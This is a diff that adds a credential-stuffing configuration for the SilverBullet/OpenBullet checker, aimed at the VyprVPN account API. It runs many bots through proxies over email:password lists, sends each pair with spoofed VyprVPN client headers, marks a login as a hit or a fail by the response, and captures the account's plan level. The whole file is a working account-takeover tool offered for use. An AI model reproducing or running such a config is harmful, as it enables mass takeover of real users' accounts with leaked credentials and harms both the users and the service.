@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "VyprVpn api",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T16:16:05.1847046+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "VYPR VPN API",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#req REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "X-GF-PLATFORM: Windows" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PLATFORM-VERSION: Windows v10.0 build(19042) X64" 
+  HEADER "X-GF-PRODUCT-VERSION: 4.3.1.10763" 
+  HEADER "X-GF-Realm: " 
+  HEADER "username: <USER>" 
+  HEADER "password: <PASS>" 
+  HEADER "X-GF-Agent: VyprVPN Windows 4.3.1.10763 (431662E3)" 
+  HEADER "locale: en_US" 
+  HEADER "Content-Type: text/html; charset=utf-8" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "Connection: close" 
+  HEADER "Server: nginx/1.16.1" 
+  HEADER "Date: Sun, 20 Feb 2022 23:32:58 GMT" 
+  HEADER "X-API-Version: 1" 
+  HEADER "Content-Length: 28" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "confirmed\": true" 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+
+#Plan PARSE "<SOURCE>" LR "vpn\": {\"account_level\": \"" "\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By" 
+
